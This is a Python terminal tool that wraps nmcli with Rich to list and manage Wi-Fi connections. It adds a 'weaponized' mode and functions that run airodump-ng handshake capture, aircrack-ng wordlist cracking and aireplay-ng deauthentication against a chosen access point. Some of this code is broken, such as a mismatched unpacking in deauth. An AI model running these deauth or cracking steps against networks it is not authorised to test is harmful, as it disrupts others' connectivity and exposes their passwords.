# create CLI wrapper for nmcli with Rich
from rich.console import Console
from rich.table import Table
from rich import box
from rich.prompt import Prompt
from rich.text import Text
from rich.align import Align
from rich.panel import Panel

import math
from os import get_terminal_size
import subprocess
import re

console = Console()
main_color = "bold blue"


def main():
    print_logo()
    
    while True:
        banner("Main Menu")
        console.print("""
1 - List all connections
2 - List all devices
3 - List all access points
4 - Connect to a network
5 - Disconnect from a network
w - Weaponized mode
6 - Exit
""", justify="center")
        console.print("", style=main_color)
        choice = Prompt.ask("Please choose an option", choices=["1", "2", "3", "4", "5", "w", "6"])

        if choice == "1":
            list_connections()
        elif choice == "2":
            list_devices()
        elif choice == "3":
            list_access_points()
        elif choice == "w":
            list_access_points_ng()
        elif choice == "4":
            connect_to_network()
        elif choice == "5":
            disconnect_from_network()
        elif choice == "6":
            console.print("Goodbye!", style=main_color)
            break

def list_connections():
    banner("List of connections")
    table = Table(show_header=True, header_style=main_color, box=box.MINIMAL)
    table.add_column("Name", style=main_color)
    table.add_column("UUID", style=main_color)
    table.add_column("Type", style=main_color)
    table.add_column("Device", style=main_color)

    output = subprocess.run(["nmcli", "-t", "-f", "name,uuid,type,device", "connection", "show"], capture_output=True, text=True)
    for line in output.stdout.splitlines():
        name, uuid, _type, device = line.split(":")
        table.add_row(name, uuid, _type, device)

    console.print(table, justify="center")


def list_devices():
    banner("List of devices")
    table = Table(show_header=True, header_style=main_color, box=box.MINIMAL)
    table.add_column("Name", style=main_color)
    table.add_column("Type", style=main_color)
    table.add_column("State", style=main_color)
    table.add_column("Driver", style=main_color)
    table.add_column("HW Address", style=main_color)

    output = subprocess.run(["nmcli", "-g", "GENERAL.DEVICE,GENERAL.TYPE,GENERAL.STATE,GENERAL.DRIVER,GENERAL.HWADDR", "device", "show"], capture_output=True, text=True)
    
    y, x = 0, 6
    lines = output.stdout.splitlines()
    length = len(lines) / 6
    for _ in range(math.ceil(length)):
        name = lines[y]
        _type = lines[y + 1]
        state = lines[y + 2]
        driver = lines[y + 3]
        hwaddr = re.sub(r'\\', '', lines[y + 4])
        table.add_row(name, _type, state, driver, hwaddr)
        y += 6
        x += 6

    console.print(table, justify="center")


def list_access_points():
    banner("List of access points")
    output = subprocess.run(["nmcli", "-t", "-f", "bssid,ssid,mode,chan,rate,signal,bars,security", "device", "wifi", "list"], capture_output=True, text=True)

    table = Table(show_header=True, header_style=main_color, box=box.MINIMAL, leading=1)

    table.add_column("BSSID", style=main_color)
    table.add_column("SSID", style=main_color)
    table.add_column("Mode", style=main_color)
    table.add_column("Channel", style=main_color)
    table.add_column("Rate", style=main_color)
    table.add_column("Signal", style=main_color)
    table.add_column("Bars", style=main_color)
    table.add_column("Security", style=main_color)

    for line in output.stdout.splitlines():
        line = re.sub(r'\\', '', line)
        b1, b2, b3, b4, b5, b6, ssid, mode, chan, rate, signal, bars, security = line.split(":")
        bssid = f"{b1}:{b2}:{b3}:{b4}:{b5}:{b6}"

        if bars == "▂▄▆█":
            bars_style = "green"
        elif bars == "▂▄▆_":
            bars_style = "yellow"
        elif bars == "▂▄__":
            bars_style = "gold3"
        elif bars == "▂___":
            bars_style = "red"

        table.add_row(bssid, ssid, mode, chan, rate, signal, bars, security, style=bars_style)

    console.print(table, justify="center")


def list_access_points_ng():
    banner("[!] Weaponized [!]", "red")
    list_devices()
    device = Prompt.ask("Please enter the device you want to use")
    banner("List of access points")
    output = subprocess.run(["nmcli", "-t", "-f", "bssid,ssid,mode,chan,rate,signal,bars,security", "device", "wifi", "list"], capture_output=True, text=True)
    table = Table(show_header=True, header_style=main_color, box=box.MINIMAL, leading=1)
    
    table.add_column("ID", style=main_color)
    table.add_column("BSSID", style=main_color)
    table.add_column("SSID", style=main_color)
    table.add_column("Mode", style=main_color)
    table.add_column("Channel", style=main_color)
    table.add_column("Rate", style=main_color)
    table.add_column("Signal", style=main_color)
    table.add_column("Bars", style=main_color)
    table.add_column("Security", style=main_color)
    
    bssid_list = []
    channel_list = []
    id_num = 0
    for line in output.stdout.splitlines():
        id_num += 1
        line = re.sub(r'\\', '', line)
        b1, b2, b3, b4, b5, b6, ssid, mode, chan, rate, signal, bars, security = line.split(":")
        bssid = f"{b1}:{b2}:{b3}:{b4}:{b5}:{b6}"
        channel_list.append(chan)
        bssid_list.append(bssid)
        if bars == "▂▄▆█":
            bars_style = "green"
        elif bars == "▂▄▆_":
            bars_style = "yellow"
        elif bars == "▂▄__":
            bars_style = "gold3"
        elif bars == "▂___":
            bars_style = "red"
        
        table.add_row(str(id_num), bssid, ssid, mode, chan, rate, signal, bars, security, style=bars_style)
    console.print(table, justify="center")
    choice = Prompt.ask("Select an access point to attack", choices=[str(i) for i in range(1, id_num + 1)])
    
    return bssid_list[int(choice) - 1], channel_list[int(choice) - 1], device


def connect_to_network():
    banner("Connect to a network")
    ssid = Prompt.ask("Please enter the SSID of the network you want to connect to")
    password = Prompt.ask("Please enter the password for the network", password=True)
    output = subprocess.run(["nmcli", "device", "wifi", "connect", ssid, "password", password], capture_output=True, text=True)
    console.print(output.stdout, justify="center")


def disconnect_from_network():
    banner("Disconnect from a network")
    ssid = Prompt.ask("Please enter the SSID of the network you want to disconnect from")
    output = subprocess.run(["nmcli", "device", "wifi", "disconnect", ssid], capture_output=True, text=True)
    console.print(output.stdout, justify="center")


def capture_handshake():
    bssid, channel, device = list_access_points_ng()
    output = subprocess.run(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", "handshake", device], capture_output=True, text=True)
    console.print(output.stdout, justify="center")


def crack_handshake():
    banner("Cracking handshake")
    wordlist = Prompt.ask("Please enter the path to the wordlist you want to use")
    output = subprocess.run(["aircrack-ng", "handshake-01.cap", "-w", wordlist], capture_output=True, text=True)
    console.print(output.stdout, justify="center")


def deauth():
    bssid, device = list_access_points_ng()
    number_of_packets = Prompt.ask("Please enter the number of packets you want to send")

    target = Prompt.ask("Do you want to deauth all clients or just one?", choices=["All", "One"])
    if target == "All":
        output = subprocess.run(["aireplay-ng", "-0", number_of_packets, "-a", bssid, device], capture_output=True, text=True)
    elif target == "One":
        client = Prompt.ask("Please enter the client's MAC address")
        output = subprocess.run(["aireplay-ng", "-0", number_of_packets, "-a", bssid, "-c", client, device], capture_output=True, text=True)
    
    console.print(output.stdout, justify="center")


def banner(msg, color="blue") -> None:
    term_width = get_terminal_width()

    console.print("─" * term_width, style=color)
    console.print(Text(msg), justify="center", style=color)
    console.print("─" * term_width, style=color)


def get_terminal_width() -> int:
    try:
        width, _ = get_terminal_size()
    except OSError:
        width = 80

    return width


def print_logo() -> None:
    width = get_terminal_width()
    height = 9
    logo = """
       8888
 888888888888888888888      888
8888888888888888888888NMCLI+888
 888888888888888888888      888
       8888
"""

    panel = Panel(
        Align(
            Text(logo, justify="center", style=main_color),
            vertical="middle",
            align="center"
        ),
        width=width,
        height=height,
        subtitle="[ www.seraphim-solutions.com ]",
    )
    console.print(panel)

if __name__ == "__main__":
    main()
